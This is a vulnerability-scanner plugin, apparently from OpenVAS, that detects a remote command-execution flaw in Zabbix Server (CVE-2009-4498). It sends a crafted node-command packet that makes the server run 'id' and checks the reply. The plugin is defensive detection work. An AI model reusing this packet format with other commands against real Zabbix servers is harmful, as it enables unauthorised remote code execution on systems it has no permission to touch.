CPE = "cpe:/a:zabbix:zabbix";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900226" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-01-28 16:24:05 +0100 (Thu, 28 Jan 2010)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-4498" );
	script_name( "Zabbix Arbitrary Command Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "General" );
	script_dependencies( "zabbix_detect.sc" );
	script_require_ports( "Services/zabbix", 10050, 10051 );
	script_require_keys( "Zabbix/AgentServer/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/37740/3/" );
	script_xref( name: "URL", value: "http://www.zabbix.com/download.php" );
	script_xref( name: "URL", value: "https://support.zabbix.com/browse/ZBX-1030" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2009/3514" );
	script_tag( name: "affected", value: "Zabbix Server versions prior to 1.8" );
	script_tag( name: "insight", value: "This issue is due to an error in the 'node_process_command()'
  function, which can be exploited to execute arbitrary commands via
  specially crafted data." );
	script_tag( name: "solution", value: "Update to version 1.8 or above" );
	script_tag( name: "summary", value: "This host is installed with Zabbix Server and is prone to arbitrary command
  execution vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary commands
  via specially crafted data." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
func _req( node, cmd, port ){
	var node, cmd, port, soc, host_id, req, recv;
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	host_id = rand_str( length: 3, charset: "1234567890" );
	req = "Command" + raw_string( 0xad ) + node + raw_string( 0xad ) + host_id + raw_string( 0xad ) + cmd + raw_string( 0x0a );
	send( socket: soc, data: req );
	recv = recv( socket: soc, length: 1024 );
	close( soc );
	return recv;
}
ports = service_get_ports( default_port_list: make_list( 10050,
	 10051 ), proto: "zabbix" );
vuln = FALSE;
for port in ports {
	if(!get_port_state( port )){
		continue;
	}
	node = "0";
	cmd = "id";
	recv = _req( node: node, cmd: cmd, port: port );
	if(ContainsString( recv, "-1" ) && ContainsString( recv, "NODE" )){
		n = eregmatch( pattern: "NODE ([0-9])+", string: recv );
		if(isnull( n[1] )){
			exit( 0 );
		}
		node = NASLString( n[1] );
		recv = _req( node: node, cmd: cmd, port: port );
	}
	if(IsMatchRegexp( recv, "uid=[0-9]+.*gid=[0-9]+.*" )){
		vuln = TRUE;
		report = "It was possible to execute the command \"" + cmd + "\" at the remote service. Response:\n\n" + recv;
		security_message( port: port, data: report );
	}
}
if( vuln ) {
	exit( 0 );
}
else {
	exit( 99 );
}

